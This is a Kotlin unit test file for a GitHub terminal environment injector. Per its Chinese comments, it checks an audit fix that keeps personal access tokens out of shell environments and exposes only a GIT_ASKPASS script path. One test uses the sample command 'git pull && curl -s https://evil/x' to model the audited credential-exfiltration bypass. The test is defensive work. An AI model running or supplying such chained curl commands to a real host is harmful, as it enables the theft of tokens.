package com.apex.agent.github

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertSame
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * GithubTerminalEnvInjector 契约测试（Git 审计 P0-1）：
 * PAT 零进 env——env 里只出现 GIT_ASKPASS 脚本路径与
 * GIT_TERMINAL_PROMPT=0；旧实现注入的 GH_TOKEN/GITHUB_TOKEN/ GIT_CONFIG_*
 * 任何键都不得再出现。
 */
class GithubTerminalEnvInjectorTest {

    @Test
    fun `askpass 路径注入且 PAT 不进 env`() {
        val env = GithubTerminalEnvInjector.inject(
            mapOf("PATH" to "/usr/bin"), "push origin main", "/tmp/guru-askpass-1.sh"
        )
        assertEquals("/tmp/guru-askpass-1.sh", env["GIT_ASKPASS"])
        assertEquals("0", env["GIT_TERMINAL_PROMPT"])
        // 旧通道的凭据键必须绝迹（确定性凭据外传链的根）
        assertNull(env["GH_TOKEN"])
        assertNull(env["GITHUB_TOKEN"])
        assertNull(env["GIT_CONFIG_COUNT"])
        assertNull(env["GIT_CONFIG_KEY_0"])
        assertNull(env["GIT_CONFIG_VALUE_0"])
    }

    @Test
    fun `复合命令后半段拿不到任何凭据`() {
        // 审计 P0-1 的击穿形态:首词 git 命中,后半段 curl——env 只含脚本路径
        val env = GithubTerminalEnvInjector.inject(
            emptyMap(), "git pull && curl -s https://evil/x", "/tmp/a.sh"
        )
        assertTrue(env.containsKey("GIT_ASKPASS"))
        assertFalse(env.containsKey("GH_TOKEN"))
        assertFalse(env.containsKey("GITHUB_TOKEN"))
    }

    @Test
    fun `非 git 命令不注入`() {
        val base = mapOf("PATH" to "/usr/bin")
        assertSame(base, GithubTerminalEnvInjector.inject(base, "curl https://x", "/tmp/a.sh"))
        assertSame(base, GithubTerminalEnvInjector.inject(base, "cd /ws && git pull", "/tmp/a.sh"))
    }

    @Test
    fun `askpass 路径为空不注入`() {
        val base = mapOf("PATH" to "/usr/bin")
        assertSame(base, GithubTerminalEnvInjector.inject(base, "git push", null))
        assertSame(base, GithubTerminalEnvInjector.inject(base, "git push", ""))
    }

    @Test
    fun `首词判定 basename 与包裹语义`() {
        assertTrue(GithubTerminalEnvInjector.isGitOrGhCommand("git status"))
        assertTrue(GithubTerminalEnvInjector.isGitOrGhCommand("/usr/bin/git push"))
        assertTrue(GithubTerminalEnvInjector.isGitOrGhCommand("gh pr create"))
        assertTrue(GithubTerminalEnvInjector.isGitOrGhCommand("\"git\" status"))
        assertFalse(GithubTerminalEnvInjector.isGitOrGhCommand("gitk"))
        assertFalse(GithubTerminalEnvInjector.isGitOrGhCommand(""))
    }
}
